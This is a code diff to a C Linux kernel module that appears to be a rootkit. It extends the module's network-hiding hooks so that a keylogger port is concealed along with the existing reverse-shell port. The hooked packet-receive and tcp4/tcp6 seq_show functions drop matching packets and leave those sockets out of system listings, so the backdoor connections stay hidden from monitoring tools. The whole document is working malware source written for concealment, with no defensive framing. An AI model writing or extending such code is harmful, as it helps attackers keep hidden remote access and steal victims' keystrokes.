@@ -19,7 +19,8 @@ asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 int (*t_real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
 asmlinkage long (*orig_raw_seq_show)(struct seq_file *seq, void *v);
 asmlinkage long (*orig_raw6_seq_show)(struct seq_file *seq, void *v);
-#define PORT 42069 //the port that will be hidden
+#define PORT 42069 //the ports that will be hidden (reverse_shell port)
+#define KEYLOGGER_PORT 46242 //keylogger port
 //only added ipv6 cuz mobile
 int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
 {
@@ -37,7 +38,8 @@ int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packe
 		if (iph->protocol == IPPROTO_ICMP) return NET_RX_DROP;
 		if (iph->protocol == IPPROTO_TCP) {
 			tcph = (void *)iph + iph->ihl * 4;
-			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
+			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT ||
+					ntohs(tcph->dest) == KEYLOGGER_PORT || ntohs(tcph->source) == KEYLOGGER_PORT)
 				return NET_RX_DROP;
 		}
 	} else if (skb->protocol == htons(ETH_P_IPV6)) {
@@ -45,7 +47,8 @@ int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packe
 		if (ip6h->nexthdr == IPPROTO_ICMPV6) return NET_RX_DROP;
 		if (ip6h->nexthdr == IPPROTO_TCP) {
 			tcph = (void *)ip6h + sizeof(*ip6h);
-			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
+			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT ||
+					ntohs(tcph->dest) == KEYLOGGER_PORT || ntohs(tcph->source) == KEYLOGGER_PORT)
 				return NET_RX_DROP;
 		}
 	}
@@ -55,13 +58,13 @@ out:
 asmlinkage long hooked_tcp4_seq_show(struct seq_file *s, void *v)
 {
 	struct sock *sk = v;
-	int ret = (sk != (struct sock *)0x1 && sk->sk_num == PORT) ? 0 : orig_tcp4_seq_show(s, v);
+	int ret = (sk != (struct sock *)0x1 && (sk->sk_num == PORT || sk->sk_num == KEYLOGGER_PORT)) ? 0 : orig_tcp4_seq_show(s, v);
 	return ret;
 }
 asmlinkage long hooked_tcp6_seq_show(struct seq_file *s, void *v)
 {
         struct sock *sk = v;
-        int ret = (sk != (struct sock *)0x1 && sk->sk_num == PORT) ? 0 : orig_tcp6_seq_show(s, v);
+        int ret = (sk != (struct sock *)0x1 && (sk->sk_num == PORT || sk->sk_num == KEYLOGGER_PORT)) ? 0 : orig_tcp6_seq_show(s, v);
         return ret;
 }
 asmlinkage long hooked_raw_seq_show(struct seq_file *seq, void *v)
